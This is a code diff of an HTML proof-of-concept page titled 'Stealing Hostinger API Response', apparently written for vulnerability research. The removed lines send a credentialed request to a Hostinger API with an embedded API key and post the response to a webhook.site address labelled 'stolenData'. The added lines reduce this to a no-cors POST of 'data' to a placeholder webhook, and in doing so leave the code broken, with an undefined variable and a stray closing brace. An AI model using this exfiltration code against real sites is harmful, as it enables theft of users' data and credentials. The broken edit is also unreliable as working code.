@@ -6,20 +6,14 @@
 <body>
   <h2>Stealing Hostinger API Response...</h2>
   <script>
-    fetch("https://experiment-api.hostinger.com/sdk/v2/vardata?v=0", {
-      method: "GET",
-      credentials: "include", // send cookies if any
-      headers: {
-        "Authorization": "Api-Key client-cW5zRM9wiB0Wa9KqimmHzMcWGBXkKSK6"
-      }
-    })
-    .then(response => response.text())
-    .then(data => {
-      fetch("https://webhook.site/133897bf-8640-4cd7-80dd-5561335f708e", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ stolenData: data })
-      });
+   fetch("https://webhook.site/your-id", {
+  method: "POST",
+  mode: "no-cors", // allow sending without preflight
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({ stolenData: data })
+});
     });
   </script>
 </body>
